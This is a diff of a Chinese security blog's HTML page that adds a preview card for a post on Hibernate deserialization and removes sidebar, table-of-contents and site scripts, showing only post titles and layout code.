+  <a class="article-category-link" href="/categories/java/">java</a> <a class="article-category-link" href="/categories/java/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/">框架漏洞</a>
+</div>
+
+
+            </div>
+          </div>
+          <div class="post-img-mobile">
+            <a href="/2025/12/30/hibernate-fan-xu-lie-hua/" style="background-size: cover; 
+              background-position: center center;">
+              <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+            </a>
+          </div>
+          <div class="post-content">
+            好久没写链子了，练手
+hibernate反序列化Hibernate 是一个广泛使用的开源对象关系映射（ORM）框架，旨在简化 Java 应用程序与关系型数据库之间的数据交互。它通过将 Java 对象与数据库表关联起来，实现了对象的持久化，开
+          </div>
+        </div>
+        <div class="post-more">
+          <a href="/2025/12/30/hibernate-fan-xu-lie-hua/">
+            <i class="iconfont iconmore" pointer style="float: right;  " title="阅读更多"></i>
+          </a>
+        </div>
+      </div>
+      <div class="post-img">
+        <a href="/2025/12/30/hibernate-fan-xu-lie-hua/" style="background-size: cover; 
+          background-position: center center;">
+          <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
         </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>Godown_blog</h2>
-        
-        
-          <p>something for nothing</p>
-
-        
-        
-          <p><span id="jinrishici-sentence">Godown_blog</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
       </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/godownio"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1958304602"
-              class="social fab fa-qq flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
+    </article>
+  
 </section>
-
-    
-  
-  
-  
-
-  <div class="layout_sticky">    
-    
-      
-<section class="widget side_toc">
-  
-  <header>
-    
-      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
-    
-  </header>
-
-
-  <div class='content'>
-    <div class="toc-main">
-      <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E6%9C%BANode1"><span class="toc-text">vulnhub靶机Node1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%9C%89%E6%95%88%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86"><span class="toc-text">一、有效资产收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-text">二、渗透测试过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">1. 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B6%8A%E6%9D%83"><span class="toc-text">2. 越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%88%86%E7%A0%B4%E8%A7%A3%E5%8E%8B%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">3. 爆破解压压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-ssh%E7%99%BB%E5%BD%95"><span class="toc-text">4. ssh登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-ubuntu16-04%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-text">5. ubuntu16.04内核提权</span></a></li></ol></li></ol></li></ol> -->
-        <div class="toc"></div>
-      </div>
-    </div>
-  </div>
-</section>
-<!-- 手机端目录按钮 -->
-<div id="toc-mobile-btn">
-  <i class="fas fa-list-ul" aria-hidden="true"></i>
 </div>
 
-      
-  <section class="widget side_recent_post">
-    
-  <header>
-    
-      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      
-      <!-- hash算法 -->
-      
-      <div class="aside-list">
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/12/30/hibernate-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">12-30</span>
-                
-              </div>
-              <a class="post-title" href="/2025/12/30/hibernate-fan-xu-lie-hua/">hibernate反序列化</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/12/25/chun-qiu-yun-jing-spoofing/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8184.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8184.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">12-25</span>
-                
-              </div>
-              <a class="post-title" href="/2025/12/25/chun-qiu-yun-jing-spoofing/">春秋云镜 Spoofing</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/12/23/oddfuzz/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8183.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8183.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">12-23</span>
-                
-              </div>
-              <a class="post-title" href="/2025/12/23/oddfuzz/">ODDFUZZ</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/12/18/chun-qiu-yun-jing-flarum/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8182.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8182.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">12-18</span>
-                
-              </div>
-              <a class="post-title" href="/2025/12/18/chun-qiu-yun-jing-flarum/">春秋云镜 Flarum</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/12/18/chun-qiu-yun-jing-delegation/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8181.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">12-18</span>
-                
-              </div>
-              <a class="post-title" href="/2025/12/18/chun-qiu-yun-jing-delegation/">春秋云镜 Delegation</a>
-            </div>
-          </div>
-        
-      </div>
-    </div>
-  </section>
-
-    
-  </div>
-</aside>
-
-  <!-- 图片放大 Wrap images with fancybox support -->
-  <script src="/js/wrapImage.js"></script>
-</div>
-
-<!-- 文章详情页背景图 -->
-<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
-	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
-	<transition-group tag="ul" :name="names">
-		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
-			<img :src="image" class="bg-swiper-img no-lazy">
-		</li>
-	</transition-group>
-</div>
-<script>
-	var vm = new Vue({
-		el: '#appBgSwiper',
-		data: {
-			names: '' || 'fade' || 'fade', // translate-fade fade
-			mark: 0,
-			img: [],
-			bgColor: '',
-			time: null
-		},
-		methods: {   //添加方法
-			change(i, m) {
-				if (i > m) {
-					// this.names = 'fade';
-				} else if (i < m) {
-					// this.names = 'fade';
-				} else {
-					return;
-				}
-				this.mark = i;
-			},
-			prev() {
-				// this.names = 'fade';
-				this.mark--;
-				if (this.mark === -1) {
-					this.mark = 3;
-					return
-				}
-			},
-			next() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			autoPlay() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			play() {
-				let bgImgDelay = '' || '180000'
-				let delay = parseInt(bgImgDelay) || 180000;
-				this.time = setInterval(this.autoPlay, delay);
-			},
-			enter() {
-				clearInterval(this.time);
-			},
-			leave() {
-				this.play();
-			}
-		},
-		created() {
-			this.play()
-		},
-		beforeDestroy() {
-			clearInterval(this.time);
-		},
-		mounted() {
-			let prop = '' || '';
-			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
-			if (isImg) {
-				let img = prop.split(',');
-				let configRoot = '/'
-				let arrImg = [];
-				img.forEach(el => {
-					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
-					var objExp = new RegExp(Expression);
-
-					if (objExp.test(el)) {
-						// http or https
-						arrImg.push(el);
-					} else {
-						// 非http or https开头
-						// 本地文件
-						let firstStr = el.charAt(0);
-						if (firstStr == '/') {
-							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
-						}
-						el = configRoot + el;
-						arrImg.push(el);
-					}
-				})
-				this.img = arrImg;
-			} else {
-				this.bgColor = prop;
-			}
-		}
-	})
-</script>
-
-<style>
-	.bg-swiper-box {
-		position: absolute;
-		display: block;
-		width: 100%;
-		height: 100%;
-	}
-
-	.bg-swiper-img {
-		object-fit: cover;
-		width: 100%;
-		height: 100%;
-	}
-</style>
-
-
-
-
-  <script>
-  function loadMermaid() {
-    if (document.getElementsByClassName('mermaid').length) {
-      if (window.mermaidJsLoad) mermaid.init()
-      else {
-        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
-          window.mermaidJsLoad = true
-          mermaid.initialize({
-            theme: 'default',
-          })
-          if ('true') {
-            mermaid.init();
-          }
-        })
-      }
-    }
-  };
-  document.addEventListener("DOMContentLoaded", function () {
-    loadMermaid();
-  })
-
-  document.addEventListener('pjax:complete', function () {
-    loadMermaid();
-  })
+<div class="w-70">
   
-</script>
-
+</div>
 
       </main>
     </div>
